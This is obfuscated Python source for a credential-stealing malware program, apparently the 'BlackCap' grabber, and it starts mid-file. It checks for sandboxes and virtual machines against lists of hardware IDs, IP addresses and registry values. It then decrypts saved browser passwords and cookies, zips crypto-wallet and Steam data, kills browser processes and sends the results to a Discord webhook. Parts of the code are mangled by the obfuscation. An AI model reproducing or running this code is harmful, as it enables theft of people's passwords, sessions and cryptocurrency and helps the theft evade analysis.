             "FCE23342-91F1-EAFC-BA97-5AAE4509E173",
             "FE455D1A-BE27-4BA4-96C8-967A6D3A9661",
             "FED63342-E0D6-C669-D53F-253D696D74DA",
             "FF577B79-782E-0A4D-8568-B35A9B7EB76B",
             "9CFF2042-2043-0340-4F9C-4BAE6DC5BB39",
             "D7AC2042-05F8-0037-54A6-38387D00B767",
             "52562042-B33F-C9D3-0149-241F40A0F5D8",
             "3E9AC505-812A-456F-A9E6-C7426582500E",
             "11E12042-2404-040A-31E4-27374099F748",
             "6E963342-B9C8-2D14-B057-C60C35722AD4",
             "9EB0FAF6-0713-4576-BD64-813DEE9E477E",
             "0B8A2042-2E8E-BECC-B6A4-7925F2163DC9",
             "89E32042-1B2B-5C76-E966-D4E363846FD4",
             "699400A5-AFC6-427A-A56F-CE63D3E121CB",
             "2F230ED7-5797-4DB2-BAA0-99A193503E4B",
             "3A512042-7806-4187-C90D-DA6925F74D0F",
             "074B2042-8EF0-B1EA-B32B-DEDCD4CED0D8",
             "B381F3F2-BEDC-4B70-B80A-1B6AF4977159"
        ]
        lIIlllllllIlI.IIlIlIllIl = [   
             "10.200.169.204",
             "104.198.155.173",
             "109.145.173.169",
             "109.226.37.172",
             "109.74.154.90",
             "109.74.154.91",
             "109.74.154.92",
             "154.61.71.50",
             "154.61.71.51",
             "174.7.32.199",
             "176.63.4.179",
             "178.239.165.70",
             "188.105.165.80",
             "188.105.71.44",
             "188.105.91.116",
             "188.105.91.143",
             "188.105.91.173",
             "192.211.110.74",
             "192.40.57.234",
             "192.87.28.103",
             "193.128.114.45",
             "193.225.193.201",
             "194.154.78.152",
             "194.154.78.160",
             "194.154.78.210",
             "194.154.78.227",
             "194.154.78.230",
             "194.154.78.77",
             "194.186.142.178",
             "194.186.142.204",
             "195.181.175.103",
             "195.181.175.105",
             "195.239.51.3",
             "195.239.51.46",
             "195.239.51.59",
             "195.239.51.65",
             "195.239.51.80",
             "195.68.142.3",
             "195.74.76.222",
             "20.99.160.173",
             "204.101.161.31",
             "204.101.161.32",
             "207.102.138.83",
             "207.102.138.93",
             "208.78.41.115",
             "212.119.227.151",
             "212.119.227.167",
             "212.119.227.179",
             "212.119.227.184",
             "212.41.6.23",
             "213.33.142.50",
             "213.33.190.118",
             "213.33.190.171",
             "213.33.190.22",
             "213.33.190.227",
             "213.33.190.35",
             "213.33.190.46",
             "213.33.190.74",
             "23.128.248.46",
             "34.105.0.27",
             "34.105.183.68",
             "34.105.72.241",
             "34.138.96.23",
             "34.141.146.114",
             "34.141.245.25",
             "34.142.74.220",
             "34.145.195.58",
             "34.145.89.174",
             "34.253.248.228",
             "34.83.46.130",
             "34.85.243.241",
             "34.85.253.170",
             "35.192.93.107",
             "35.199.6.13",
             "35.229.69.227",
             "35.237.47.12",
             "45.8.148.171",
             "64.124.12.162",
             "67.218.111.202",
             "78.139.8.50",
             "79.104.209.109",
             "79.104.209.231",
             "79.104.209.24",
             "79.104.209.249",
             "79.104.209.33",
             "79.104.209.66",
             "80.211.0.97",
             "84.147.54.113",
             "84.147.54.61",
             "84.147.56.249",
             "84.147.60.41",
             "84.147.60.52",
             "84.147.61.28",
             "84.147.62.12",
             "84.147.63.171",
             "84.147.63.236",
             "87.166.48.65",
             "87.166.50.1",
             "87.166.50.213",
             "87.166.51.209",
             "88.132.225.100",
             "88.132.226.203",
             "88.132.227.238",
             "88.132.231.71",
             "88.153.199.169",
             "88.64.35.141",
             "88.66.107.75",
             "88.67.131.90",
             "88.86.117.130",
             "89.208.29.106",
             "89.208.29.140",
             "89.208.29.149",
             "89.208.29.64",
             "92.211.109.160",
             "92.211.192.144",
             "92.211.52.62",
             "92.211.55.199",
             "93.216.75.209",
             "95.25.204.90",
             "95.25.71.12",
             "95.25.71.5",
             "95.25.71.64",
             "95.25.71.70",
             "95.25.71.86",
             "95.25.71.89",
             "95.25.81.24",
             "84.57.200.69",
             "194.154.78.179",
             "213.33.190.242",
             "89.208.29.95",
             "95.25.71.65",
             "194.186.142.246",
             "213.33.190.42",
             "89.208.29.96",
             "89.208.29.97",
             "195.68.142.20",
             "79.104.209.221",
             "95.25.71.80",
             "194.186.142.180",
             "195.239.51.42",
             "79.104.209.172",
             "194.186.142.195",
             "194.154.78.91",
             "89.208.29.98",
             "95.25.71.92",
             "212.119.227.136",
             "95.25.71.112",
             "88.64.36.101",
             "213.33.190.109",
             "89.208.29.108",
             "194.186.142.236",
             "194.186.142.183",
             "95.25.71.87",
             "88.66.8.175",
             "213.33.190.69",
             "194.186.142.214",
             "79.104.209.36",
             "195.239.51.89",
             "172.105.89.202",
             "194.154.78.144",
             "194.154.78.169",
             "52.250.30.131"
             ]
        for lllIIllI in [lIIlllllllIlI.IllIIlllIlIIIlIlIll, lIIlllllllIlI.llIIIIlIll, lIIlllllllIlI.lIlIlIlIIl]:
            IIlIIlllII = threading.Thread(llIlIIllIIIl=lllIIllI, daemon=True)
            lIIlllllllIlI.IIIIllll.append(IIlIIlllII)
            IIlIIlllII.start()
        for lIllIIllIlIIII in lIIlllllllIlI.IIIIllll:
            try:
                lIllIIllIlIIII.join()
            except RuntimeError:
                continue
    def IllIlIIlIlIlll(lIIlllllllIlI):
        lIIlllllllIlI.__class__.lllllllI = True
    def IllIIlllIlIIIlIlIll(lIIlllllllIlI):
        for lllIllIIlIlllllIIIIl in [IlIIllIll'D:\Tools', IlIIllIll'D:\OS2', IlIIllIll'D:\NT3X']:
            if ntpath.exists(lllIllIIlIlllllIIIIl):
                lIIlllllllIlI.IllIlIIlIlIlll()
        for IlIlIIIlIll in lIIlllllllIlI.lllIlIlllIllllI:
            if lIIllIllII == IlIlIIIlIll:
                lIIlllllllIlI.IllIlIIlIlIlll()
        for llllllllIIIIIlI in lIIlllllllIlI.lIlllllll:
            if IIIIlIIIIIlllIIlIlI == llllllllIIIIIlI:
                lIIlllllllIlI.IllIlIIlIlIlll()
        for lIIllllllIIlllIlllll in lIIlllllllIlI.IIlIlIllIl:
            if lIIlllllllIlI.llllIIlI()[0] == lIIllllllIIlllIlllll:
                lIIlllllllIlI.IllIlIIlIlIlll()
        for llIIIIllIll in lIIlllllllIlI.IlllIlIIllllllIIlI:
            if lIIlllllllIlI.lIIlIllIII()[0] == llIIIIllIll:
                lIIlllllllIlI.IllIlIIlIlIlll()
    def lIlIlIlIIl(lIIlllllllIlI):
        if int(llllIlll) <= 3: 
            lIIlllllllIlI.IllIlIIlIlIlll()
        if int(llIIIlIIlIlIlIIIIlll) <= 120:  
            lIIlllllllIlI.IllIlIIlIlIlll()
        if int(psutil.cpu_count()) <= 1:
            lIIlllllllIlI.IllIlIIlIlIlll()
    def llIIIIlIll(lIIlllllllIlI):
        IIIIlIIlllIlIIl = os.system("REG QUERY HKEY_LOCAL_MACHINE\\SYSTEM\\ControlSet001\\Control\\Class\\{4D36E968-E325-11CE-BFC1-08002BE10318}\\0000\\DriverDesc 2> nul")
        IlIlIIlIIllIlIIl = os.system("REG QUERY HKEY_LOCAL_MACHINE\\SYSTEM\\ControlSet001\\Control\\Class\\{4D36E968-E325-11CE-BFC1-08002BE10318}\\0000\\ProviderName 2> nul")
        if (IIIIlIIlllIlIIl and IlIlIIlIIllIlIIl) != 1:
            lIIlllllllIlI.IllIlIIlIlIlll()
        lIIIIllllIIIIl = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, 'SYSTEM\\CurrentControlSet\\Services\\Disk\\Enum')
        try:
            IlllIIIlllIlIllIlII = winreg.QueryValueEx(lIIIIllllIIIIl, '0')[0]
            if ("VMware" or "VBOX") in IlllIIIlllIlIllIlII:
                lIIlllllllIlI.IllIlIIlIlIlll()
        finally:
            winreg.CloseKey(lIIIIllllIIIIl)
if __name__ == "__main__" and os.lIIlllIlIlIIlII == "nt":
    asyncio.lllIIlIlI(llllIllIlllIIIlIl().IlIlIllllIIIlI())
IlllIIlIIlllI = os.getenv('LOCALAPPDATA')
IllllllI = os.getenv('APPDATA')
lIIllIlIlIIIIIlIII = os.getenv("TEMP")
lIlIIlIlIllIlIll = []
def lIllllIIIllIIllIIll(llllllII: str) -> str or bool | None:
        return IllllllllIIlIIlll.get(llllllII)
lIIlIIllIIIIIIl = lIllllIIIllIIllIIll("yourwebhookurl")
class IIIIlIlIllllllIIl(Structure):
    lIlIllIIllllIIlllII = [
        ('cbData', wintypes.DWORD),
        ('pbData', POINTER(c_char))
    ]
def IIIlllIllIlllllllIll(IlIlllIllIIIIlI):
    IlllIIIIlIlIlIIlIIl = int(IlIlllIllIIIIlI.IlllIIIIlIlIlIIlIIl)
    lIIIIllIlIl = IlIlllIllIIIIlI.lIIIIllIlIl
    IIIIlIlIIlIII = c_buffer(IlllIIIIlIlIlIIlIIl)
    cdll.msvcrt.memcpy(IIIIlIlIIlIII, lIIIIllIlIl, IlllIIIIlIlIlIIlIIl)
    windll.kernel32.LocalFree(lIIIIllIlIl)
    return IIIIlIlIIlIII.raw
def lIIIlllllI(llIIlIIIlllIIlllII, lllIllIIlIlIlll=lllllIllIIIl''):
    lIIIlIIlIlIlI = c_buffer(llIIlIIIlllIIlllII, len(llIIlIIIlllIIlllII))
    IIIlllIIIIIlIIlIlI = c_buffer(lllIllIIlIlIlll, len(lllIllIIlIlIlll))
    llllIlIllllll = IIIIlIlIllllllIIl(len(llIIlIIIlllIIlllII), lIIIlIIlIlIlI)
    lllIIlIIllllIIllllll = IIIIlIlIllllllIIl(len(lllIllIIlIlIlll), IIIlllIIIIIlIIlIlI)
    IlIlllIllIIIIlI = IIIIlIlIllllllIIl()
    if windll.crypt32.lIIIlllllI(byref(llllIlIllllll), None, byref(lllIIlIIllllIIllllll), None, None, 0x01, byref(IlIlllIllIIIIlI)):
        return IIIlllIllIlllllllIll(IlIlllIllIIIIlI)
def IlllIIllllIlIllIlIlI(IllIlIIIIIIlll, IIlIllIllIIlIII=None):
    lIIlIlIIIll = IllIlIIIIIIlll.decode(encoding='utf8', errors='ignore')[:3]
    if lIIlIlIIIll == 'v10' or lIIlIlIIIll == 'v11':
        IIllllIllIlIlIllI = IllIlIIIIIIlll[3:15]
        llIlIlIlIIlIIIllII = IllIlIIIIIIlll[15:]
        IllIlIIIIIlllllIIIlI = AES.new(IIlIllIllIIlIII, AES.MODE_GCM, IIllllIllIlIlIllI)
        IIIlllIllIlIIllll = IllIlIIIIIlllllIIIlI.decrypt(llIlIlIlIIlIIIllII)
        IIIlllIllIlIIllll = IIIlllIllIlIIllll[:-16].decode()
        return IIIlllIllIlIIllll
def llIIIlIllIlI(IIIlIlIIlIlIII, lIIlllllIIIlIlIIlIl, lIlIIIllIIlI='', files='', headers=''):
    for lIlIllllIllIlIIllII in range(8):
        try:
            if IIIlIlIIlIlIII == 'POST':
                if lIlIIIllIIlI != '':
                    IlIIllIll = requests.post(lIIlllllIIIlIlIIlIl, lIlIIIllIIlI=lIlIIIllIIlI)
                    if IlIIllIll.status_code == 200:
                        return IlIIllIll
                elif IIllllIlllIlIlIIl != '':
                    IlIIllIll = requests.post(lIIlllllIIIlIlIIlIl, IIllllIlllIlIlIIl=IIllllIlllIlIlIIl)
                    if IlIIllIll.status_code == 200 or IlIIllIll.status_code == 413: 
                        return IlIIllIll
        except:
            pass
def IlIlIIlllllIllI(lIIlIIllIIIIIIl, lIlIIIllIIlI='', files='', headers=''):
    for lIlIllllIllIlIIllII in range(8):
        try:
            if IlIIllIIIl != '':
                IlIIllIll = urlopen(Request(lIIlIIllIIIIIIl, lIlIIIllIIlI=lIlIIIllIIlI, IlIIllIIIl=IlIIllIIIl))
                return IlIIllIll
            else:
                IlIIllIll = urlopen(Request(lIIlIIllIIIIIIl, lIlIIIllIIlI=lIlIIIllIIlI))
                return IlIIllIll
        except:
            pass
def lIlIlIllllIlllIIIII(llIIllIIIllI):
    global IllllIllIIIIlllII
    lIlIIIllIIlI = str(llIIllIIIllI)
    IIllIIlIIllllIll = re.findall(".google.com", lIlIIIllIIlI)
    if len(IIllIIlIIllllIll) < -1:
        IllllIllIIIIlllII = True
        return IllllIllIIIIlllII
    else:
        IllllIllIIIIlllII = False
        return IllllIllIIIIlllII
def IlllIIIIllllI(lIIllIlIIIIlllI):
    llllllII = re.findall("(\w+[a-z])",lIIllIlIIIIlllI)
    while "https" in llllllII: llllllII.remove("https")
    while "com" in llllllII: llllllII.remove("com")
    while "net" in llllllII: llllllII.remove("net")
    return list(set(llllllII))
def IllIIlIlIIllIIIlI(lIIlllIlIlIIlII, lIlIllIIlIlIIIIIlII=''):
    IlIIllIIIl = {
        "Content-Type": "application/json",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0"
    }
    if lIIlllIlIlIIlII == "bc_checking":
        lIlIIIllIIlI = {
        "content": '',
        "embeds": [
            {
            "fields": [
                {
                "name": "Interesting files found on user PC:",
                "value": lIlIllIIlIlIIIIIlII
                }
            ],
            "author": {
                'name': llllIlIlll'asd',
                'url': 'https://github.com/dscKSCH',
                'icon_url': 'https://raw.githubusercontent.com/KSCHdsc/DestruCord-Inject/main/blackcap.gif'
            },
            "footer": {
                "text": "aasd"
            },
            'color': 374276,
            }
        ],
        "avatar_url": "https://raw.githubusercontent.com/KSCHdsc/BlackCap-Assets/main/blackcap%20(2).png",
        "attachments": []
        }
        IlIlIIlllllIllI(lIIlIIllIIIIIIl, lIlIIIllIIlI=dumps(lIlIIIllIIlI).encode(), IlIIllIIIl=IlIIllIIIl)
        return
    lllIllIIlIlllllIIIIl = lIIlllIlIlIIlII
    IIllllIlllIlIlIIl = {'file': open(lllIllIIlIlllllIIIIl, 'rb')}
    if "bc_allpasswords" in lIIlllIlIlIIlII:
        llIIIIIIIlII = ' | '.join(IllIllIIllII for IllIllIIllII in IIllllIIIIl)
        if len(llIIIIIIIlII) > 1000:
            lIlIIIIIlIll = IlllIIIIllllI(str(IIllllIIIIl))
            llIIIIIIIlII = ' | '.join(IllIllIIllII for IllIllIIllII in lIlIIIIIlIll)
        lIlIIIllIIlI = {
        "content": '',
        "embeds": [
            {
            "fields": [
                {
                "name": "Passwords Found:",
                "value": llIIIIIIIlII
                }
            ],
            "author": {
                'name': llllIlIlll'asd',
                'url': 'https://github.com/KSaasdsc',
                'icon_url': 'https://raw.githubusercontent.com/KSCHdsc/DestruCord-Inject/main/blackcap.gif'
            },
            "footer": {
                "text": "asd",
            },
            'color': 374276,
            }
        ],
         "avatar_url": "https://raw.githubusercontent.com/KSCHdsc/BlackCap-Assets/main/blackcap%20(2).png",
        "attachments": []
        }
        IlIlIIlllllIllI(lIIlIIllIIIIIIl, lIlIIIllIIlI=dumps(lIlIIIllIIlI).encode(), IlIIllIIIl=IlIIllIIIl)
    if "bc_allcookies" in lIIlllIlIlIIlII:
        IIlllIIIIIlI = ' | '.join(IllIllIIllII for IllIllIIllII in lllIIIIlIIIlllI)
        if len(IIlllIIIIIlI) > 1000:
            IllIllllIIIIIII = IlllIIIIllllI(str(lllIIIIlIIIlllI))
            IIlllIIIIIlI = ' | '.join(IllIllIIllII for IllIllIIllII in IllIllllIIIIIII)
        lIlIIIllIIlI = {
        "content": '',
        "embeds": [
            {
            "fields": [
                {
                "name": "Cookies Found:",
                "value": IIlllIIIIIlI
                }
            ],
            "author": {
                'name': llllIlIlll'asd',
                'url': 'https://github.com/KSCHdsc',
                'icon_url': 'https://raw.githubusercontent.com/KSCHdsc/DestruCord-Inject/main/blackcap.gif'
            },
            "footer": {
                "text": "asd",
            },
            'color': 374276,
            }
        ],
         "avatar_url": "https://raw.githubusercontent.com/KSCHdsc/BlackCap-Assets/main/blackcap%20(2).png",
        "attachments": []
        }
        IlIlIIlllllIllI(lIIlIIllIIIIIIl, lIlIIIllIIlI=dumps(lIlIIIllIIlI).encode(), IlIIllIIIl=IlIIllIIIl)
    llIIIlIllIlI("POST", lIIlIIllIIIIIIl, IIllllIlllIlIlIIl=IIllllIlllIlIlIIl)
def IIlIlllIlIlIIIllII(lIlIIIllIIlI, lIIlllIlIlIIlII):
    lllIllIIlIlllllIIIIl = os.getenv("TEMP") + llllIlIlll"\{nlIlIlIIIlIlllIlllIImlllllIIIlIIllIlIlllIllIII}.txt"
    with open(lllIllIIlIlllllIIIIl, mode='w', encoding='utf-8') as llllIlIlll:
        llllIlIlll.write(llllIlIlll"asd | https://github.com/asd\n\n")
        for lIIlIllllIlIlIl in lIlIIIllIIlI:
            if lIIlIllllIlIlIl[0] != '':
                llllIlIlll.write(llllIlIlll"{lIIlIllllIlIlIIIIlIIllIlIlllIllI}\n")
lIllIlIIIIlIlIIIIl = []
def IllIlIIIlIIIlllI(lllIllIIlIlllllIIIIl, IIIllIIIIIIllIll):
    global lIllIlIIIIlIlIIIIl
    if not os.lllIllIIlIlllllIIIIl.exists(lllIllIIlIlllllIIIIl): return
    lIllIlIIl = lllIllIIlIlllllIIIIl + IIIllIIIIIIllIll + "/Login Data"
    if os.stat(lIllIlIIl).st_size == 0: return
    lIlIlIlllIlIl = lIIllIlIlIIIIIlIII + "blackcaped" + ''.join(random.choice('bcdefghijklmnopqrstuvwxyz') for i in range(8)) + ".db"
    shutil.copy2(lIllIlIIl, lIlIlIlllIlIl)
    IlIIIlIII = connect(lIlIlIlllIlIl)
    IlIIIlIIIlll = IlIIIlIII.IlIIIlIIIlll()
    IlIIIlIIIlll.execute("SELECT action_url, username_value, password_value FROM logins;")
    lIlIIIllIIlI = IlIIIlIIIlll.fetchall()
    IlIIIlIIIlll.close()
    IlIIIlIII.close()
    os.remove(lIlIlIlllIlIl)
    IlIIllIllIllllIIIll = lllIllIIlIlllllIIIIl + "/Local State"
    with open(IlIIllIllIllllIIIll, 'r', encoding='utf-8') as llllIlIlll: IlllIIIIlIIIlIl = loads(llllIlIlll.read())
    IIlIllIllIIlIII = b64decode(IlllIIIIlIIIlIl['os_crypt']['encrypted_key'])
    IIlIllIllIIlIII = lIIIlllllI(IIlIllIllIIlIII[5:])
    for IIlllIlIIIl in lIlIIIllIIlI:
        if IIlllIlIIIl[0] != '':
            for lllllIllIllll in lIIIllIlIlI:
                IIIIlIllIIIlllI = lllllIllIllll
                if "https" in lllllIllIllll:
                    IIlIIIlIIIlllIllI = lllllIllIllll
                    lllllIllIllll = IIlIIIlIIIlllIllI.split('[')[1].split(']')[0]
                if lllllIllIllll in IIlllIlIIIl[0]:
                    if not IIIIlIllIIIlllI in IIllllIIIIl: IIllllIIIIl.append(IIIIlIllIIIlllI)
            lIllIlIIIIlIlIIIIl.append(llllIlIlll"URL: {row[0]} \n ID: {row[1]} \n PASSW0RD: {IlllIIllllIlIllIlIlI(IIlllIlIIIl[2], mlIlIlIIIlIlllIlllIIslIllIIllIlIIIIeIlIIllIllIIllIIllllIlIIlIlkllllllIIlIIlIIlIIIIIllIIIlIIllIlIlllIllII)}\n\n")
    IIlIlllIlIlIIIllII(lIllIlIIIIlIlIIIIl, 'bc_allpasswords')
llIIllIIIllI = []
def llIIllllIIllIlll(lllIllIIlIlllllIIIIl, IIIllIIIIIIllIll):
    global llIIllIIIllI
    if not os.lllIllIIlIlllllIIIIl.exists(lllIllIIlIlllllIIIIl): return
    lIllIlIIl = lllIllIIlIlllllIIIIl + IIIllIIIIIIllIll + "/Cookies"
    if os.stat(lIllIlIIl).st_size == 0: return
    lIlIlIlllIlIl = lIIllIlIlIIIIIlIII + "blackcaped" + ''.join(random.choice('bcdefghijklmnopqrstuvwxyz') for i in range(8)) + ".db"
    shutil.copy2(lIllIlIIl, lIlIlIlllIlIl)
    IlIIIlIII = connect(lIlIlIlllIlIl)
    IlIIIlIIIlll = IlIIIlIII.IlIIIlIIIlll()
    IlIIIlIIIlll.execute("SELECT host_key, name, encrypted_value FROM cookies")
    lIlIIIllIIlI = IlIIIlIIIlll.fetchall()
    IlIIIlIIIlll.close()
    IlIIIlIII.close()
    os.remove(lIlIlIlllIlIl)
    IlIIllIllIllllIIIll = lllIllIIlIlllllIIIIl + "/Local State"
    with open(IlIIllIllIllllIIIll, 'r', encoding='utf-8') as llllIlIlll: IlllIIIIlIIIlIl = loads(llllIlIlll.read())
    IIlIllIllIIlIII = b64decode(IlllIIIIlIIIlIl['os_crypt']['encrypted_key'])
    IIlIllIllIIlIII = lIIIlllllI(IIlIllIllIIlIII[5:])
    for IIlllIlIIIl in lIlIIIllIIlI:
        if IIlllIlIIIl[0] != '':
            for lllllIllIllll in lIIIllIlIlI:
                IIIIlIllIIIlllI = lllllIllIllll
                if "https" in lllllIllIllll:
                    IIlIIIlIIIlllIllI = lllllIllIllll
                    lllllIllIllll = IIlIIIlIIIlllIllI.split('[')[1].split(']')[0]
                if lllllIllIllll in IIlllIlIIIl[0]:
                    if not IIIIlIllIIIlllI in lllIIIIlIIIlllI: lllIIIIlIIIlllI.append(IIIIlIllIIIlllI)
            llIIllIIIllI.append(llllIlIlll"{IIlllIlIIIl[0]}	TRUE"+"		"+ f"/FALSE	2597573456	{IIlllIlIIIl[1]}	{IlllIIllllIlIllIlIlI(IIlllIlIIIl[2], IIlIllIllIIlIII)}")
    IIlIlllIlIlIIIllII(llIIllIIIllI, 'bc_allcookies')
def IlllIllIlIllIlIllll(lIlIIIlIIIIlllIIlI):
    for llIIllIlIlII in psutil.process_iter():
        try:
            if lIlIIIlIIIIlllIIlI.lower() in llIIllIlIlII.lIIlllIlIlIIlII().lower():
                return True
        except (psutil.NoSuchProcess, psutil.AccessDenied, psutil.ZombieProcess):
            pass
    return False;
def lIlIlIlIIllllIl(lllIllIIlIlllllIIIIl, IIIllIIIIIIllIll, IIllIlllllllI):
    lIllIlIIl = lllIllIIlIlllllIIIIl
    lIIlllIlIlIIlII = IIIllIIIIIIllIll
    if "aholpfdialjgjfhomihkjbmgjidlcdno" in IIIllIIIIIIllIll:
        llIIlllI = lllIllIIlIlllllIIIIl.split("\\")[4].split("/")[1].replace(' ', '')
        lIIlllIlIlIIlII = llllIlIlll"Exodus_{lllllIllIIIlIIlllIlIIIlsllllllIIIlIIllIlIIIlIIllIlIlllIllI}"
        lIllIlIIl = lllIllIIlIlllllIIIIl + IIIllIIIIIIllIll
    if "nkbihfbeogaeaoehlefnkodbefgpgknn" in IIIllIIIIIIllIll:
        llIIlllI = lllIllIIlIlllllIIIIl.split("\\")[4].split("/")[1].replace(' ', '')
        lIIlllIlIlIIlII = llllIlIlll"Metamask_{lllllIllIIIlIIlllIlIIIlsllllllIIIlIIllIlIIIlIIllIlIlllIllI}"
        lIllIlIIl = lllIllIIlIlllllIIIIl + IIIllIIIIIIllIll
    if not os.lllIllIIlIlllllIIIIl.exists(lIllIlIIl): return
    if IlllIllIlIllIlIllll('chrome.exe'):
        print('Yes a chrome process was running')
        subprocess.Popen(llllIlIlll"taskkill /im {IIllIllllllIIIlIIllIlIlllIllII} /t /f", shell=True)
    else:
        ...
    if "Wallet" in IIIllIIIIIIllIll or "NationsGlory" in IIIllIIIIIIllIll:
        llIIlllI = lllIllIIlIlllllIIIIl.split("\\")[4].split("/")[1].replace(' ', '')
        lIIlllIlIlIIlII = llllIlIlll"{lllllIllIIIlIIlllIlIIIlsllllllIIIlIIllIlIIIlIIllIlIlllIllI}"
    elif "Steam" in IIIllIIIIIIllIll:
        if not os.lllIllIIlIlllllIIIIl.isfile(llllIlIlll"{plIlIlIIIlIlllIlllIIlIllIIllIIIIlIIllIlIlllIllIIIIIhC}/loginusers.vdf"): return
        llllIlIlll = open(llllIlIlll"{plIlIlIIIlIlllIlllIIlIllIIllIIIIlIIllIlIlllIllIIIIIhC}/loginusers.vdf", "r+", encoding="utf8")
        lIlIIIllIIlI = llllIlIlll.readlines()
        llIIllIIl = False
        for IIIlIIllIlIlllIllI in lIlIIIllIIlI:
            if 'RememberPassword"\lIllIIllIlIIII\lIllIIllIlIIII"1"' in IIIlIIllIlIlllIllI:
                llIIllIIl = True
        if llIIllIIl == False: return
        lIIlllIlIlIIlII = IIIllIIIIIIllIll
    IIlIllIlIlllllIlIl = zipfile.ZipFile(llllIlIlll"{palIllIIllIlIIIIhC}/{nlIlIlIIIlIlllIlllIImlllllIIIlIIllIlIlllIllIII}.zip", "w")
    print(IIlIllIlIlllllIlIl)
    for lIIIIlllIl in os.listdir(lIllIlIIl):
        if not ".zip" in lIIIIlllIl: IIlIllIlIlllllIlIl.write(lIllIlIIl + "/" + lIIIIlllIl)
    IIlIllIlIlllllIlIl.close()
    IllIIlIlIIllIIIlI(llllIlIlll'{palIllIIllIlIIIIhC}/{nlIlIlIIIlIlllIlllIImlllllIIIlIIllIlIlllIllIII}.zip')
    os.remove(llllIlIlll"{palIllIIllIlIIIIhC}/{nlIlIlIIIlIlllIlllIImlllllIIIlIIllIlIlllIllIII}.zip")
def lllllIlI():
    llIIIlIlIIl = [
        [llllIlIlll"{IlIIllIllolIlIlIIIlIlllIlllIImlIlIllllIllIlIIlIIIlIIllIlIlllIllIIIng}/Opera Software/Opera GX Stable",               "opera.exe",    "/Local Storage/leveldb",           "/",            "/Network",             "/Local Extension Settings/nkbihfbeogaeaoehlefnkodbefgpgknn"                      ],
        [llllIlIlll"{IlIIllIllolIlIlIIIlIlllIlllIImlIlIllllIllIlIIlIIIlIIllIlIlllIllIIIng}/Opera Software/Opera Stable",                  "opera.exe",    "/Local Storage/leveldb",           "/",            "/Network",             "/Local Extension Settings/nkbihfbeogaeaoehlefnkodbefgpgknn"                      ],
        [llllIlIlll"{IlIIllIllolIlIlIIIlIlllIlllIImlIlIllllIllIlIIlIIIlIIllIlIlllIllIIIng}/Opera Software/Opera Neon/User Data/Default",  "opera.exe",    "/Local Storage/leveldb",           "/",            "/Network",             "/Local Extension Settings/nkbihfbeogaeaoehlefnkodbefgpgknn"                      ],
        [llllIlIlll"{IlllIIlIIllIIIlIIllIlIlllIllII}/Google/Chrome/User Data",                        "chrome.exe",   "/Default/Local Storage/leveldb",   "/Default",     "/Default/Network",     "/Default/Local Extension Settings/nkbihfbeogaeaoehlefnkodbefgpgknn"              ],
        [llllIlIlll"{IlllIIlIIllIIIlIIllIlIlllIllII}/Google/Chrome SxS/User Data",                    "chrome.exe",   "/Default/Local Storage/leveldb",   "/Default",     "/Default/Network",     "/Default/Local Extension Settings/nkbihfbeogaeaoehlefnkodbefgpgknn"              ],
        [llllIlIlll"{IlllIIlIIllIIIlIIllIlIlllIllII}/BraveSoftware/Brave-Browser/User Data",          "brave.exe",    "/Default/Local Storage/leveldb",   "/Default",     "/Default/Network",     "/Default/Local Extension Settings/nkbihfbeogaeaoehlefnkodbefgpgknn"              ],
        [llllIlIlll"{IlllIIlIIllIIIlIIllIlIlllIllII}/Yandex/YandexBrowser/User Data",                 "yandex.exe",   "/Default/Local Storage/leveldb",   "/Default",     "/Default/Network",     "/HougaBouga/nkbihfbeogaeaoehlefnkodbefgpgknn"                                    ],
        [llllIlIlll"{IlllIIlIIllIIIlIIllIlIlllIllII}/CocCoc/Browsers/User Data",                      "browser.exe",  "/Default/Local Storage/leveldb",   "/Default",     "/Default/Network",     "/Default/Local Extension Settings/nkbihfbeogaeaoehlefnkodbefgpgknn"              ],        
        [llllIlIlll"{IlllIIlIIllIIIlIIllIlIlllIllII}/Microsoft/Edge/User Data",                       "edge.exe",     "/Default/Local Storage/leveldb",   "/Default",     "/Default/Network",     "/Default/Local Extension Settings/nkbihfbeogaeaoehlefnkodbefgpgknn"              ]
    ]
    IIllllllIll = [
        [llllIlIlll"{IlIIllIllolIlIlIIIlIlllIlllIImlIlIllllIllIlIIlIIIlIIllIlIlllIllIIIng}/atomic/Local Storage/leveldb", '"Atomic Wallet.exe"', "Wallet"],
        [llllIlIlll"{IlIIllIllolIlIlIIIlIlllIlllIImlIlIllllIllIlIIlIIIlIIllIlIlllIllIIIng}/Exodus/exodus.wallet", "Exodus.exe", "Wallet"],
        ["C:\Program Files (x86)\Steam\config", "steam.exe", "Steam"],
        [llllIlIlll"{IlIIllIllolIlIlIIIlIlllIlllIImlIlIllllIllIlIIlIIIlIIllIlIlllIllIIIng}/NationsGlory/Local Storage/leveldb", "NationsGlory.exe", "NationsGlory"]
    ]
    for IlIlllIlllIIlIIIl in llIIIlIlIIl:
        lIlIlIIIlIlllIlllII = threading.Thread(llIlIIllIIIl=IllIlIIIlIIIlllI, llIlIllIIlIIlIIIlIll=[IlIlllIlllIIlIIIl[0], IlIlllIlllIIlIIIl[3]])
        lIlIlIIIlIlllIlllII.start()
        lIlIIlIlIllIlIll.append(lIlIlIIIlIlllIlllII)
    llIIlIlIIlIllI = []
    for IlIlllIlllIIlIIIl in llIIIlIlIIl:
        lIlIlIIIlIlllIlllII = threading.Thread(llIlIIllIIIl=llIIllllIIllIlll, llIlIllIIlIIlIIIlIll=[IlIlllIlllIIlIIIl[0], IlIlllIlllIIlIIIl[4]])
        lIlIlIIIlIlllIlllII.start()
        llIIlIlIIlIllI.append(lIlIlIIIlIlllIlllII)
    for lllIlIIlIlllI in llIIlIlIIlIllI: lllIlIIlIlllI.join()
    IllllIllIIIIlllII = lIlIlIllllIlllIIIII(llIIllIIIllI)
    if IllllIllIIIIlllII == True: return
    for IlIlllIlllIIlIIIl in llIIIlIlIIl:
        threading.Thread(llIlIIllIIIl=lIlIlIlIIllllIl, llIlIllIIlIIlIIIlIll=[IlIlllIlllIIlIIIl[0], IlIlllIlllIIlIIIl[5], IlIlllIlllIIlIIIl[1]]).start()
    for IlIlllIlllIIlIIIl in IIllllllIll:
        threading.Thread(llIlIIllIIIl=lIlIlIlIIllllIl, llIlIllIIlIIlIIIlIll=[IlIlllIlllIIlIIIl[0], IlIlllIlllIIlIIIl[2], IlIlllIlllIIlIIIl[1]]).start()
    for lllIlIIlIlllI in lIlIIlIlIllIlIll:
        lllIlIIlIlllI.join()
    global IlIllIIlI
    IlIllIIlI = []
